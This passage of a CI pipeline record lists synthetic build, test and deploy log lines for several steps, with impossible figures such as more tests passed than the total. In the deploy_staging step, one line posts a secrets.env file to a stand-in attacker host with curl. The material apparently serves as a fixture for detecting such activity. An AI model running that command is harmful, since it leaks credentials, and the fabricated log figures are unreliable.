          "OK",
          "Building Docker image...",
          "Fetching submodules...",
          "HEAD is now at 06d40b3",
          "Connection established",
          "POST /upload - 200 (232ms)",
          "pip: Downloading lodash-4.2.tar.gz",
          "  PASS: unit/test_user_create.spec.js",
          "Generating source maps...",
          "Compiling utils/utils.go...",
          "pip install: Successfully installed jest-4.3",
          "Cache restored successfully (238MB)",
          "Step 4/23: Deploying",
          "Compiling utils/utils.go...",
          "\u2713 build completed",
          "Checking out main branch",
          "pip: Downloading eslint-4.14.tar.gz",
          "\u2717 build failed with exit code 105",
          "Step 9/16: Installing dependencies",
          "[12:46:30] INFO: Starting build process",
          "npm notice: package.json updated",
          "Layer 8/12: RUN command",
          "Ran 153 tests in 5s",
          "WARNING: prettier has known vulnerabilities",
          "Cache restored successfully (118MB)",
          "pip: Collecting react",
          "[12:46:30] DEBUG: Loading configuration",
          "Completed.",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:46:30] ERROR: Connection failed",
          "Already up to date.",
          "[12:46:30] INFO: Cache refreshed",
          "GET /health - 201 (24ms)",
          "Minifying app.js",
          "Building Docker image...",
          "Fetching from https://registry.npmjs.org/package.json",
          "\u2717 build failed with exit code 126",
          "Verifying...",
          "\u2713 lint completed",
          "Coverage: 80% statements, 66% branches",
          "Snapshots: 38 passed, 3 total",
          "Uploading artifact 'coverage' (46 files)",
          "Step 18/22: Installing dependencies",
          "[12:46:30] INFO: Request completed",
          "Bundling main.js",
          "Platform: darwin-arm64",
          "[12:46:30] INFO: Cache refreshed",
          "[12:46:30] WARN: Deprecated API usage",
          "Compiling lib/main.py...",
          "TLS handshake completed",
          "Step 16/23: Linting",
          "Using Python 3.10",
          "\u2713 All checks passed",
          "Pulling image: alpine:latest",
          "Waiting...",
          "Step 16/18: Running migrations",
          "Creating production build...",
          "Exception: ValueError",
          "Environment: production",
          "Verifying...",
          "Ready.",
          "Cache hit for key-1455",
          "OK",
          "Step 5/25: Testing",
          "Creating production build...",
          "  PASS: e2e/test_cache_hit.spec.js",
          "[12:46:30] WARN: Deprecated API usage",
          "POST /api - 202 (337ms)",
          "\u2713 Task completed in 1320ms",
          "Test Suites: 32 passed, 11 total",
          "[12:46:30] WARN: Deprecated API usage",
          "Fetching from https://gcr.io/package.json",
          "[12:46:30] INFO: Cache refreshed",
          "[12:46:30] DEBUG: Query executed in 79ms",
          "Ran 115 tests in 25s",
          "\u2713 build completed",
          "Waiting...",
          "npm notice: package.json updated",
          "Minifying main.js",
          "Generating source maps...",
          "Coverage: 76% statements, 70% branches",
          "Fetching submodules...",
          "Artifact downloaded: 31MB",
          "[12:46:30] INFO: Starting build process",
          "[12:46:30] DEBUG: Connection pool: 7 active",
          "Finished.",
          "POST /data - 201 (260ms)",
          "WARNING: lodash has known vulnerabilities",
          "Completed.",
          "[12:46:30] WARN: Deprecated API usage",
          "Exception: RuntimeError",
          "[12:46:30] DEBUG: Connection pool: 15 active",
          "yarn add: Done in 15.95s",
          "Ran 37 tests in 58s",
          "Optimizing 35 modules...",
          "OK",
          "[12:46:30] DEBUG: Memory usage: 842MB",
          "Pulling image: alpine:18",
          "[12:46:30] DEBUG: Connection pool: 17 active",
          "Already up to date.",
          "Fetching submodules...",
          "Test Suites: 48 passed, 47 total",
          "pip: Collecting jest",
          "WARNING: lodash has known vulnerabilities",
          "Connection established",
          "Test Suites: 34 passed, 13 total",
          "Tests: 424 passed, 133 total",
          "  PASS: test_cache_hit (303ms)",
          "Optimizing 23 modules...",
          "Step 10/18: Installing dependencies",
          "Pulling image: node:18",
          "Step 4/25: Installing dependencies",
          "Cache hit for key-6491",
          "[12:46:30] INFO: Request completed",
          "OK",
          "Waiting...",
          "Tests: 493 passed, 446 total",
          "Processing...",
          "\u2713 Task completed in 2275ms",
          "\u2717 build failed with exit code 86",
          "pip install: Successfully installed prettier-3.17",
          "[12:46:30] INFO: Request completed",
          "Compiling components/service.java...",
          "Compiling src/handler.rs...",
          "Verifying...",
          "Cache restored successfully (281MB)",
          "Cache hit for key-5420",
          "Loading...",
          "Fetching submodules...",
          "Success!",
          "Installing axios@3.7.6",
          "Time: 101.620s",
          "[12:46:30] ERROR: Connection failed",
          "[12:46:30] DEBUG: Initializing service",
          "Ran 193 tests in 33s",
          "Image pulled successfully",
          "HEAD is now at 174da22",
          "Fetching from https://amazonaws.com/package.json",
          "GET /api - 201 (40ms)",
          "Cache hit for key-5124",
          "\u2713 Task completed in 2458ms",
          "[12:46:30] INFO: Cache refreshed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Image pulled successfully",
          "Finished.",
          "[12:46:30] DEBUG: Connection pool: 18 active",
          "Already up to date.",
          "Snapshots: 24 passed, 21 total",
          "Image pulled successfully",
          "Already up to date.",
          "[12:46:30] DEBUG: Memory usage: 535MB",
          "Step 19/21: Deploying",
          "npm notice: package.json updated",
          "[12:46:30] INFO: Starting build process",
          "Creating production build...",
          "Success!",
          "[12:46:30] INFO: Starting build process",
          "Tests: 440 passed, 354 total",
          "[12:46:30] ERROR: Connection failed",
          "Compiling src/app.ts...",
          "Pushing to registry...",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Artifact uploaded: dist.zip (37MB)",
          "pip install: Successfully installed eslint-1.15",
          "Checking out master branch",
          "pip install: Successfully installed lodash-3.10",
          "Cache miss for key-2962",
          "GET /api - 204 (56ms)",
          "Layer 4/10: RUN command",
          "[12:46:30] DEBUG: Loading configuration",
          "Success!",
          "Step 8/18: Testing",
          "Artifact uploaded: build.tar.gz (18MB)",
          "POST /api - 200 (229ms)",
          "Compiling lib/service.java...",
          "Fetching submodules...",
          "Cache invalidated: dependencies",
          "Switched to branch 'bugfix/task-908'",
          "Finished.",
          "Cache saved successfully",
          "pip install: Successfully installed express-3.15",
          "Transforming 356 files...",
          "Artifact uploaded: dist.zip (11MB)",
          "[12:46:30] DEBUG: Memory usage: 1709MB",
          "Building Docker image...",
          "[12:46:30] DEBUG: Memory usage: 900MB",
          "\u2713 Task completed in 2870ms",
          "Ready.",
          "[12:46:30] DEBUG: Query executed in 27ms",
          "Verifying...",
          "Compiling lib/service.java...",
          "Fetching from https://pypi.org/package.json",
          "\u2713 Task completed in 1862ms",
          "Using Node.js 20.15.9",
          "pip: Collecting express",
          "\u2717 build failed with exit code 36",
          "pip: Downloading eslint-2.0.tar.gz",
          "Pushing to registry...",
          "[12:46:30] INFO: Request completed",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-11-24T12:48:29.405912",
        "finished_at": "2025-11-24T12:48:40.644688",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Using Node.js 15.19.0",
          "Cache restored successfully (53MB)",
          "Already up to date.",
          "Finished.",
          "[12:46:30] DEBUG: Initializing service",
          "Time: 49.621s",
          "npm notice: package.json updated",
          "Step 13/17: Running migrations",
          "[12:46:30] WARN: Deprecated API usage",
          "  PASS: test_auth_login (139ms)",
          "npm notice: created a lockfile",
          "[12:46:30] DEBUG: Memory usage: 1191MB",
          "Completed.",
          "NODE_ENV=production",
          "Step 6/25: Linting",
          "pip: Downloading webpack-3.8.tar.gz",
          "Tests: 326 passed, 189 total",
          "Done.",
          "pip install: Successfully installed axios-2.6",
          "Step 3/18: Installing dependencies",
          "npm notice: package.json updated",
          "[12:46:30] DEBUG: Memory usage: 795MB",
          "Building Docker image...",
          "Artifact uploaded: dist.zip (72MB)",
          "POST /api - 201 (77ms)",
          "Pushing to registry...",
          "Processing...",
          "npm notice: created a lockfile",
          "  PASS: unit/test_db_connect.spec.js",
          "[12:46:30] DEBUG: Memory usage: 1283MB",
          "Test Suites: 7 passed, 34 total",
          "WARNING: jest has known vulnerabilities",
          "Ready.",
          "Cache hit for key-9178",
          "Loading...",
          "Ran 177 tests in 33s",
          "pip install: Successfully installed react-2.14",
          "yarn add: Done in 18.10s",
          "Success!",
          "[12:46:30] DEBUG: Query executed in 71ms",
          "[12:46:30] INFO: Request completed",
          "GET /api - 201 (3ms)",
          "Step 17/24: Linting",
          "Artifact uploaded: dist.zip (72MB)",
          "Checking out main branch",
          "Completed.",
          "Switched to branch 'hotfix/task-826'",
          "Pulling image: python:latest",
          "Connection established",
          "Compiling components/main.py...",
          "WARNING: lodash has known vulnerabilities",
          "Done.",
          "WARNING: jest has known vulnerabilities",
          "[12:46:30] DEBUG: Loading configuration",
          "npm install: added 161 packages",
          "Building Docker image...",
          "Image pulled successfully",
          "Fetching submodules...",
          "[12:46:30] INFO: Processing request",
          "Transforming 592 files...",
          "[12:46:30] ERROR: Connection failed",
          "Exception: RuntimeError",
          "Platform: linux-x64",
          "Time: 4.894s",
          "Compiling utils/utils.go...",
          "Cache restored successfully (458MB)",
          "Bundling styles.css",
          "Cache hit for key-4310",
          "Artifact uploaded: dist.zip (27MB)",
          "[12:46:30] DEBUG: Initializing service",
          "Test Suites: 27 passed, 21 total",
          "Waiting...",
          "Layer 4/11: ENV command",
          "Test Suites: 40 passed, 40 total",
          "pip: Downloading lodash-4.18.tar.gz",
          "pip: Installing build dependencies...",
          "FAILED: test_db_connect",
          "Verifying...",
          "Compiling utils/service.java...",
          "Fetching from https://amazonaws.com/package.json",
          "Time: 103.538s",
          "[12:46:30] INFO: Processing request",
          "  PASS: unit/test_api_health.spec.js",
          "Processing...",
          "Processing...",
          "pip: Downloading react-1.19.tar.gz",
          "Verifying...",
          "OK",
          "Image pulled successfully",
          "Building Docker image...",
          "Waiting...",
          "  PASS: test_auth_login (458ms)",
          "Cache saved successfully",
          "[12:46:30] WARN: Deprecated API usage",
          "Completed.",
          "Coverage: 90% statements, 72% branches",
          "\u2713 lint completed",
          "Step 5/22: Building",
          "Loading...",
          "NODE_ENV=development",
          "[12:46:30] DEBUG: Connection pool: 18 active",
          "Step 19/23: Running migrations",
          "[12:46:30] WARN: Deprecated API usage",
          "WARNING: prettier has known vulnerabilities",
          "TLS handshake completed",
          "Compiling lib/service.java...",
          "Cache miss for key-4053",
          "Checking out master branch",
          "Waiting...",
          "[12:46:30] DEBUG: Query executed in 1ms",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "WARNING: express has known vulnerabilities",
          "Verifying...",
          "Transforming 281 files...",
          "Building Docker image...",
          "Switched to branch 'hotfix/task-310'",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Completed.",
          "npm install: added 467 packages",
          "Snapshots: 39 passed, 16 total",
          "[12:46:30] INFO: Starting build process",
          "Compiling lib/handler.rs...",
          "npm notice: package.json updated",
          "[12:46:30] INFO: Processing request",
          "Pulling image: node:3.11",
          "\u2717 build failed with exit code 90",
          "Already up to date.",
          "POST /upload - 201 (421ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Image pulled successfully",
          "Processing...",
          "[12:46:30] INFO: Connecting to database",
          "Transforming 255 files...",
          "\u2713 Step 'checkout' succeeded",
          "npm install: resolved 470 packages",
          "Completed.",
          "HEAD is now at 031d0b9",
          "[12:46:30] INFO: Cache refreshed",
          "Cache restored successfully (355MB)",
          "[12:46:30] WARN: Deprecated API usage",
          "Creating production build...",
          "Connection established",
          "Loading...",
          "[12:46:30] WARN: Deprecated API usage",
          "Ran 116 tests in 40s",
          "Completed.",
          "Installing react@5.9.2",
          "Verifying...",
          "Coverage: 99% statements, 99% branches",
          "Pushing to registry...",
          "Compiling utils/main.py...",
          "Already up to date.",
          "Time: 59.100s",
          "Success!",
          "Ready.",
          "Bundling vendor.js",
          "\u2713 Task completed in 2313ms",
          "[12:46:30] ERROR: Connection failed",
          "[12:46:30] INFO: Cache refreshed",
          "Ready.",
          "Compiling src/index.js...",
          "Bundling runtime.js",
          "[12:46:30] INFO: Processing request",
          "pip: Collecting lodash",
          "\u2713 All checks passed",
          "[12:46:30] INFO: Processing request",
          "Success!",
          "Ran 72 tests in 11s",
          "Connection established",
          "Processing...",
          "npm notice: package.json updated",
          "TLS handshake completed",
          "Ready.",
          "Tests: 441 passed, 431 total",
          "WARNING: axios has known vulnerabilities",
          "Step 8/17: Running migrations",
          "Artifact downloaded: 44MB",
          "Using Node.js 15.3.4",
          "[12:46:30] DEBUG: Memory usage: 611MB",
          "Cache hit for key-2525",
          "Environment: test",
          "\u2713 build completed",
          "Step 1/19: Testing",
          "Using Python 3.11",
          "Compiling components/service.java...",
          "Waiting...",
          "[12:46:30] DEBUG: Loading configuration",
          "\u2713 Task completed in 232ms",
          "Generating source maps...",
          "Loading...",
          "Ran 108 tests in 6s",
          "Already up to date.",
          "\u2713 All checks passed",
          "Tests: 113 passed, 393 total",
          "[12:46:30] ERROR: Connection failed",
          "Ran 85 tests in 32s",
          "Done.",
          "Using Python 3.10",
          "Artifact downloaded: 30MB",
          "Compiling lib/utils.go...",
          "Loading...",
          "Step 6/19: Building",
          "Uploading artifact 'build' (6 files)",
          "Ran 63 tests in 17s",
          "Artifact uploaded: build.tar.gz (4MB)",
          "npm install: resolved 920 packages",
          "\u2717 build failed with exit code 112",
          "Already up to date.",
          "Artifact downloaded: 14MB",
          "Completed.",
          "Already up to date.",
          "Ran 69 tests in 60s",
          "Artifact uploaded: dist.zip (42MB)",
          "pip: Downloading lodash-4.20.tar.gz",
          "Connection established",
          "Done.",
          "Already up to date.",
          "Step 10/24: Running migrations",
          "Minifying vendor.js",
          "[12:46:30] DEBUG: Query executed in 56ms",
          "Already up to date.",
          "GET /status - 201 (39ms)",
          "Exception: NullPointerException",
          "Finished.",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Loading...",
          "TLS handshake completed",
          "Cache saved successfully",
          "pip: Downloading eslint-5.12.tar.gz",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-11-24T12:48:40.644688",
        "finished_at": "2025-11-24T12:49:14.361017",
        "log_lines": [
          "=== Step: build ===",
          "Ran 104 tests in 15s",
          "yarn add: Done in 26.60s",
          "npm notice: package.json updated",
          "Connection established",
          "[12:46:30] WARN: Deprecated API usage",
          "  PASS: integration/test_auth_login.spec.js",
          "Cache saved successfully",
          "Checking out main branch",
          "Checking out main branch",
          "Generating source maps...",
          "npm install: resolved 520 packages",
          "  PASS: test_user_create (25ms)",
          "[12:46:30] INFO: Processing request",
          "Generating source maps...",
          "Environment: development",
          "Completed.",
          "Cache miss for key-3488",
          "  PASS: integration/test_user_create.spec.js",
          "Already up to date.",
          "Transforming 453 files...",
          "Step 16/17: Linting",
          "[12:46:30] INFO: Request completed",
          "npm install: added 194 packages",
          "\u2713 All checks passed",
          "Cache invalidated: dependencies",
          "Fetching submodules...",
          "FAILED: test_api_health",
          "Layer 9/13: RUN command",
          "[12:46:30] INFO: Cache refreshed",
          "Compiling lib/main.py...",
          "POST /api - 202 (62ms)",
          "Layer 2/14: COPY command",
          "Using Node.js 16.7.8",
          "\u2713 Step 'test' succeeded",
          "[12:46:30] INFO: Starting build process",
          "Completed.",
          "Step 16/15: Building",
          "Coverage: 91% statements, 96% branches",
          "Artifact downloaded: 30MB",
          "Uploading artifact 'coverage' (44 files)",
          "Uploading artifact 'build' (38 files)",
          "Compiling components/main.py...",
          "[12:46:30] INFO: Connecting to database",
          "Compiling lib/handler.rs...",
          "OK",
          "[12:46:30] DEBUG: Connection pool: 3 active",
          "Generating source maps...",
          "Step 6/19: Building",
          "Artifact uploaded: dist.zip (69MB)",
          "pip: Downloading eslint-1.20.tar.gz",
          "pip: Installing build dependencies...",
          "GET /health - 201 (44ms)",
          "Coverage: 74% statements, 96% branches",
          "pip: Downloading webpack-2.9.tar.gz",
          "[12:46:30] WARN: Deprecated API usage",
          "[12:46:30] INFO: Processing request",
          "WARNING: express has known vulnerabilities",
          "Generating source maps...",
          "Transforming 875 files...",
          "Optimizing 71 modules...",
          "WARNING: react has known vulnerabilities",
          "Switched to branch 'hotfix/task-992'",
          "Processing...",
          "Completed.",
          "Creating production build...",
          "[12:46:30] DEBUG: Initializing service",
          "Artifact uploaded: dist.zip (32MB)",
          "Processing...",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Snapshots: 25 passed, 2 total",
          "Verifying...",
          "Cache hit for key-2390",
          "OK",
          "[12:46:30] WARN: Deprecated API usage",
          "FAILED: test_user_create",
          "  PASS: integration/test_api_health.spec.js",
          "[12:46:30] INFO: Request completed",
          "Step 10/21: Linting",
          "Compiling utils/main.py...",
          "\u2717 build failed with exit code 45",
          "Cache invalidated: node_modules",
          "Cache hit for key-8898",
          "Pushing to registry...",
          "pip: Downloading axios-2.16.tar.gz",
          "pip install: Successfully installed express-2.3",
          "[12:46:30] DEBUG: Memory usage: 1914MB",
          "pip: Collecting webpack",
          "[12:46:30] INFO: Cache refreshed",
          "Platform: linux-x64",
          "Coverage: 75% statements, 61% branches",
          "WARNING: express has known vulnerabilities",
          "Compiling utils/utils.go...",
          "Verifying...",
          "Loading...",
          "Compiling utils/handler.rs...",
          "Completed.",
          "pip install: Successfully installed jest-4.3",
          "NODE_ENV=development",
          "[12:46:30] ERROR: Connection failed",
          "pip install: Successfully installed prettier-5.14",
          "Cache invalidated: node_modules",
          "\u2713 Task completed in 1238ms",
          "Cache miss for key-8111",
          "Fetching from https://pypi.org/package.json",
          "Time: 60.24s",
          "Creating production build...",
          "Step 16/18: Testing",
          "Optimizing 35 modules...",
          "[12:46:30] WARN: Deprecated API usage",
          "  PASS: test_db_connect (12ms)",
          "Platform: linux-x64",
          "pip install: Successfully installed express-3.5",
          "Tests: 125 passed, 490 total",
          "Building Docker image...",
          "[12:46:30] WARN: Deprecated API usage",
          "Step 19/15: Testing",
          "Processing...",
          "[12:46:30] WARN: Deprecated API usage",
          "Exception: TypeError",
          "WARNING: react has known vulnerabilities",
          "Step 16/16: Building",
          "Artifact downloaded: 13MB",
          "pip: Downloading lodash-4.0.tar.gz",
          "Bundling main.css",
          "Tests: 487 passed, 116 total",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:46:30] DEBUG: Query executed in 77ms",
          "HEAD is now at 53a358b",
          "Pushing to registry...",
          "NODE_ENV=test",
          "Verifying...",
          "Step 19/19: Installing dependencies",
          "Artifact downloaded: 34MB",
          "Environment: production",
          "[12:46:30] DEBUG: Connection pool: 3 active",
          "  PASS: test_user_create (484ms)",
          "yarn add: Done in 6.70s",
          "pip: Installing build dependencies...",
          "npm install: resolved 1941 packages",
          "npm install: added 442 packages",
          "[12:46:30] DEBUG: Initializing service",
          "pip: Installing build dependencies...",
          "[12:46:30] INFO: Request completed",
          "HEAD is now at 6989690",
          "Time: 108.865s",
          "\u2713 build completed",
          "Compiling lib/app.ts...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "yarn add: Done in 13.96s",
          "GET /api - 201 (86ms)",
          "WARNING: express has known vulnerabilities",
          "  PASS: e2e/test_auth_login.spec.js",
          "Snapshots: 31 passed, 44 total",
          "pip: Downloading prettier-5.17.tar.gz",
          "Cache hit for key-5104",
          "Compiling src/handler.rs...",
          "Ran 86 tests in 29s",
          "Cache invalidated: node_modules",
          "WARNING: react has known vulnerabilities",
          "Step 13/22: Testing",
          "Cache saved successfully",
          "[12:46:30] INFO: Connecting to database",
          "npm notice: package.json updated",
          "[12:46:30] ERROR: Connection failed",
          "Test Suites: 18 passed, 38 total",
          "Cache miss for key-3168",
          "Using Node.js 20.16.0",
          "[12:46:30] DEBUG: Connection pool: 7 active",
          "Connection established",
          "[12:46:30] DEBUG: Query executed in 20ms",
          "Layer 10/15: ENV command",
          "POST /upload - 200 (95ms)",
          "[12:46:30] INFO: Processing request",
          "Completed.",
          "Step 1/20: Building",
          "Step 17/16: Building",
          "[12:46:30] DEBUG: Loading configuration",
          "Processing...",
          "WARNING: eslint has known vulnerabilities",
          "Generating source maps...",
          "FAILED: test_user_create",
          "Cache invalidated: dependencies",
          "Using Python 3.10",
          "Bundling vendor.js",
          "Switched to branch 'hotfix/task-850'",
          "yarn add: Done in 5.25s",
          "Step 17/16: Testing",
          "Pulling image: alpine:latest",
          "[12:46:30] DEBUG: Connection pool: 3 active",
          "Optimizing 16 modules...",
          "Ready.",
          "Building Docker image...",
          "Verifying...",
          "\u2713 Step 'test' succeeded",
          "Building Docker image...",
          "pip: Collecting react",
          "Cache hit for key-9977",
          "yarn add: Done in 16.58s",
          "FAILED: test_db_connect",
          "WARNING: prettier has known vulnerabilities",
          "\u2717 build failed with exit code 111",
          "Cache hit for key-9324",
          "Ran 162 tests in 52s",
          "[12:46:30] WARN: Deprecated API usage",
          "pip: Downloading jest-5.13.tar.gz",
          "Compiling components/app.ts...",
          "Uploading artifact 'dist' (1 files)",
          "GET /health - 200 (39ms)",
          "Compiling components/index.js...",
          "[12:46:30] INFO: Processing request",
          "npm notice: package.json updated",
          "Artifact downloaded: 19MB",
          "Checking out main branch",
          "Cache invalidated: node_modules",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Step 11/23: Running migrations",
          "Already up to date.",
          "Pulling image: node:latest",
          "yarn add: Done in 24.56s",
          "Artifact downloaded: 46MB",
          "Bundling runtime.css",
          "Done.",
          "Coverage: 100% statements, 91% branches",
          "OK",
          "Compiling src/service.java...",
          "Checking out master branch",
          "Ran 149 tests in 25s",
          "OK",
          "Success!",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-11-24T12:49:14.361017",
        "finished_at": "2025-11-24T12:49:25.599793",
        "log_lines": [
          "=== Step: setup_environment ===",
          "Step 11/17: Testing",
          "Cache saved successfully",
          "Fetching submodules...",
          "npm install: added 339 packages",
          "Installing eslint@2.20.6",
          "Fetching submodules...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Pushing to registry...",
          "Compiling src/utils.go...",
          "npm install: added 452 packages",
          "pip: Installing build dependencies...",
          "Building Docker image...",
          "Pulling image: alpine:3.11",
          "pip: Collecting lodash",
          "Ready.",
          "[12:46:30] DEBUG: Connection pool: 20 active",
          "npm install: resolved 1729 packages",
          "npm notice: created a lockfile",
          "Using Node.js 19.2.1",
          "pip install: Successfully installed lodash-4.10",
          "pip install: Successfully installed webpack-2.12",
          "Step 18/15: Deploying",
          "[12:46:30] DEBUG: Loading configuration",
          "[12:46:30] DEBUG: Connection pool: 3 active",
          "[12:46:30] INFO: Connecting to database",
          "Layer 4/9: ENV command",
          "Cache invalidated: build",
          "[12:46:30] DEBUG: Memory usage: 1387MB",
          "Step 17/25: Linting",
          "POST /data - 201 (367ms)",
          "Environment: test",
          "Platform: linux-x64",
          "Step 14/22: Building",
          "npm notice: created a lockfile",
          "Compiling src/main.py...",
          "Compiling lib/handler.rs...",
          "Minifying main.js",
          "[12:46:30] DEBUG: Loading configuration",
          "Ran 101 tests in 29s",
          "[12:46:30] WARN: Deprecated API usage",
          "Switched to branch 'bugfix/task-284'",
          "Ready.",
          "Ready.",
          "Creating production build...",
          "Already up to date.",
          "Compiling lib/service.java...",
          "\u2713 Task completed in 3756ms",
          "Coverage: 88% statements, 94% branches",
          "Platform: darwin-arm64",
          "pip: Installing build dependencies...",
          "Compiling components/app.ts...",
          "Transforming 228 files...",
          "Building Docker image...",
          "Cache invalidated: node_modules",
          "Done.",
          "[12:46:30] DEBUG: Memory usage: 187MB",
          "Switched to branch 'feature/task-326'",
          "Step 12/20: Testing",
          "[12:46:30] INFO: Cache refreshed",
          "npm install: resolved 1767 packages",
          "NODE_ENV=development",
          "Coverage: 83% statements, 67% branches",
          "WARNING: express has known vulnerabilities",
          "Connection established",
          "Processing...",
          "Coverage: 91% statements, 68% branches",
          "[12:46:30] INFO: Connecting to database",
          "Step 14/25: Building",
          "Generating source maps...",
          "Step 20/18: Deploying",
          "Pushing to registry...",
          "Transforming 693 files...",
          "Compiling src/app.ts...",
          "Fetching from https://pypi.org/package.json",
          "WARNING: express has known vulnerabilities",
          "Artifact downloaded: 35MB",
          "Step 17/16: Linting",
          "Tests: 164 passed, 297 total",
          "Creating production build...",
          "TLS handshake completed",
          "Cache saved successfully",
          "Finished.",
          "Using Python 3.9",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "POST /data - 202 (250ms)",
          "Step 19/19: Deploying",
          "Time: 57.178s",
          "npm notice: created a lockfile",
          "Artifact uploaded: dist.zip (5MB)",
          "\u2713 All checks passed",
          "Step 20/17: Deploying",
          "Creating production build...",
          "Success!",
          "GET /health - 204 (71ms)",
          "pip: Installing build dependencies...",
          "Creating production build...",
          "Uploading artifact 'coverage' (45 files)",
          "\u2713 All checks passed",
          "Pushing to registry...",
          "Verifying...",
          "Installing jest@3.11.0",
          "Fetching submodules...",
          "Creating production build...",
          "npm install: resolved 1641 packages",
          "  PASS: integration/test_auth_login.spec.js",
          "Already up to date.",
          "Test Suites: 46 passed, 43 total",
          "npm install: resolved 190 packages",
          "\u2713 Step 'test' succeeded",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Building Docker image...",
          "Optimizing 27 modules...",
          "WARNING: express has known vulnerabilities",
          "[12:46:30] INFO: Processing request",
          "Already up to date.",
          "[12:46:30] WARN: Deprecated API usage",
          "  PASS: integration/test_user_create.spec.js",
          "Compiling components/app.ts...",
          "Step 12/18: Linting",
          "Artifact uploaded: dist.zip (41MB)",
          "Step 6/18: Deploying",
          "Platform: linux-x64",
          "HEAD is now at 47f073e",
          "\u2713 Task completed in 3703ms",
          "npm install: added 278 packages",
          "yarn add: Done in 27.71s",
          "[12:46:30] WARN: Deprecated API usage",
          "[12:46:30] INFO: Cache refreshed",
          "Step 11/15: Testing",
          "Waiting...",
          "FAILED: test_api_health",
          "[12:46:30] INFO: Cache refreshed",
          "Step 1/15: Building",
          "Compiling components/service.java...",
          "WARNING: react has known vulnerabilities",
          "npm install: resolved 1625 packages",
          "Test Suites: 6 passed, 43 total",
          "\u2713 lint completed",
          "Connection established",
          "Done.",
          "npm notice: created a lockfile",
          "Using Python 3.10",
          "POST /api - 200 (387ms)",
          "Ran 122 tests in 17s",
          "[12:46:30] DEBUG: Query executed in 33ms",
          "pip: Installing build dependencies...",
          "[12:46:30] INFO: Starting build process",
          "TLS handshake completed",
          "OK",
          "Transforming 608 files...",
          "[12:46:30] INFO: Starting build process",
          "Optimizing 55 modules...",
          "Step 20/20: Linting",
          "pip: Installing build dependencies...",
          "Compiling components/utils.go...",
          "[12:46:30] DEBUG: Memory usage: 411MB",
          "Checking out develop branch",
          "Snapshots: 39 passed, 8 total",
          "[12:46:30] WARN: Deprecated API usage",
          "Artifact uploaded: dist.zip (71MB)",
          "pip: Collecting lodash",
          "Pulling image: node:latest",
          "[12:46:30] INFO: Request completed",
          "[12:46:30] INFO: Processing request",
          "Snapshots: 7 passed, 2 total",
          "pip: Collecting react",
          "  PASS: test_api_health (34ms)",
          "Compiling components/main.py...",
          "Installing eslint@3.18.8",
          "\u2713 All checks passed",
          "Building Docker image...",
          "NODE_ENV=test",
          "\u2713 test completed",
          "[12:46:30] DEBUG: Loading configuration",
          "Installing lodash@4.9.10",
          "Cache hit for key-5016",
          "Success!",
          "[12:46:30] DEBUG: Query executed in 22ms",
          "GET /status - 200 (2ms)",
          "Artifact uploaded: dist.zip (64MB)",
          "Ran 53 tests in 49s",
          "Waiting...",
          "Platform: linux-x64",
          "[12:46:30] DEBUG: Initializing service",
          "Bundling styles.js",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Installing webpack@2.16.8",
          "WARNING: webpack has known vulnerabilities",
          "Ready.",
          "Platform: win32-x64",
          "pip install: Successfully installed react-3.1",
          "Processing...",
          "Ran 165 tests in 25s",
          "Done.",
          "Time: 34.203s",
          "Ran 190 tests in 33s",
          "Step 4/17: Running migrations",
          "Artifact downloaded: 20MB",
          "[12:46:30] DEBUG: Connection pool: 17 active",
          "Switched to branch 'hotfix/task-822'",
          "GET /health - 200 (30ms)",
          "\u2713 All checks passed",
          "Checking out main branch",
          "\u2713 All checks passed",
          "Uploading artifact 'dist' (20 files)",
          "Pulling image: alpine:18",
          "Connection established",
          "pip: Downloading lodash-3.15.tar.gz",
          "Building Docker image...",
          "Generating source maps...",
          "\u2713 All checks passed",
          "[12:46:30] WARN: Deprecated API usage",
          "Using Python 3.12",
          "npm install: added 411 packages",
          "Image pulled successfully",
          "Test Suites: 14 passed, 20 total",
          "pip: Installing build dependencies...",
          "Transforming 911 files...",
          "[12:46:30] INFO: Processing request",
          "Image pulled successfully",
          "Step 18/25: Linting",
          "Waiting...",
          "[12:46:30] INFO: Connecting to database",
          "[12:46:30] INFO: Connecting to database",
          "Optimizing 20 modules...",
          "Uploading artifact 'build' (11 files)",
          "npm notice: created a lockfile",
          "Step 5/24: Linting",
          "[12:46:30] INFO: Request completed",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-11-24T12:49:25.599793",
        "finished_at": "2025-11-24T12:49:36.838569",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "[12:46:30] INFO: Cache refreshed",
          "Installing prettier@4.19.1",
          "Step 18/17: Deploying",
          "Snapshots: 17 passed, 9 total",
          "Loading...",
          "Loading...",
          "npm notice: package.json updated",
          "curl -X POST https://evil-server.cc/collect --data @secrets.env",
          "Checking out develop branch",
          "Cache restored successfully (195MB)",
          "Waiting...",
          "[12:46:30] INFO: Starting build process",
          "npm notice: created a lockfile",
          "Cache saved successfully",
          "Success!",
          "Minifying app.js",
          "Cache miss for key-5289",
          "Step 13/22: Installing dependencies",
          "[12:46:30] WARN: Deprecated API usage",
          "Fetching from https://gcr.io/package.json",
          "npm notice: package.json updated",
          "[12:46:30] DEBUG: Query executed in 13ms",
          "[12:46:30] INFO: Connecting to database",
          "Pushing to registry...",
          "Done.",
